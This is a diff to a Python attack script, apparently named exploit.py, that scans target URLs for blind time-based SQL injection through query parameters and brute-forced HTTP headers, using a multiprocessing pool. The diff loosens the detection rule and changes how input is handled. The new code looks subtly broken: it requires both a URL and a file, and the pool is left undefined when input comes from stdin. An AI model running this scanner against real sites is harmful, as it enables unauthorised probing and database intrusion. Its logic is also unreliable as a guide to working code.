@@ -25,16 +25,17 @@ def menu():
     options, args = parser.parse_args()
 
     if not options.url and not options.file:
-        print('[+] Specify an url or file')
+        print('[+] Specify an url')
         print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
-        print('[+] Example usage: exploit.py -f urls -t 10')
-
         exit()
     if not options.time_to_sleep:
         print('[+] Specify a blind time based payload')
         print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
         exit()
-
+    if not options.file:
+        print('[+] Specify a file')
+        print('[+] Example usage: exploit.py -f urls -u http://target-uri/ -t 10')
+        exit()
     globals().update(locals())
 
 def mesure_time_loading(url,url_replaced=False,header_word=False,value_word=False):
@@ -67,7 +68,7 @@ def check_sqli_time_based(url,url_replaced=False,header_word=False,value_word=Fa
     blind_elapsed_time = mesure_time_loading(url,url_replaced,header_word,value_word)
     second_elapsed_time = mesure_time_loading(url)
     average_common_elapsed_time = round((sum([first_elapsed_time+second_elapsed_time])/2),2)
-    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep and blind_elapsed_time > 10
+    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep
 
     if url_replaced:
         url=url_replaced # just to log the sqli url
@@ -134,15 +135,12 @@ def brute_blind_header(url):
 
 def main():
     menu()
-    fire = multiprocessing.Pool(options.threads)
     if not sys.stdin.isatty():
         urls = sys.stdin.read()
-    elif options.url:
-        urls = options.url
-        url_mutation_querie_fuzz(urls)
-    elif options.file:
+    else:
         f = open(options.file)
         urls = map(str.strip, f.readlines())
+        fire = multiprocessing.Pool(options.threads)
     if options.brute_file_to_fuzz_header:
         try:
             fire.map(brute_blind_header, urls)
